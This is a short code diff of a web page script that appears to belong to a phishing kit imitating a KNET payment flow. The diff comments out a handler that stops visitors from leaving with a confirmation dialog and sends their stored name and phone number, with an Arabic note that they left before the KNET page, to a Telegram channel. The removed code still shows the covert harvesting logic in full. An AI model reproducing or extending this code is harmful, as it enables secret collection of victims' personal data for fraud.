@@ -8,20 +8,20 @@
 
 <script>
 
-window.addEventListener('beforeunload', function (e) {
-    // This will trigger a browser confirmation dialog
-    e.preventDefault();
-    e.returnValue = ''; 
+// window.addEventListener('beforeunload', function (e) {
+
+//     e.preventDefault();
+//     e.returnValue = ''; 
 
     
-    message = `
-    خرج قبل صفحة الكي نت
-    أسم الشخص: ${localStorage.getItem('userName')} 
-    رقم الهاتف: ${localStorage.getItem('phone')} 
-    `
-    send_telegram_message(message)
+//     message = `
+//     خرج قبل صفحة الكي نت
+//     أسم الشخص: ${localStorage.getItem('userName')} 
+//     رقم الهاتف: ${localStorage.getItem('phone')} 
+//     `
+//     send_telegram_message(message)
 
-});
+// });
     
 </script>
 <head>
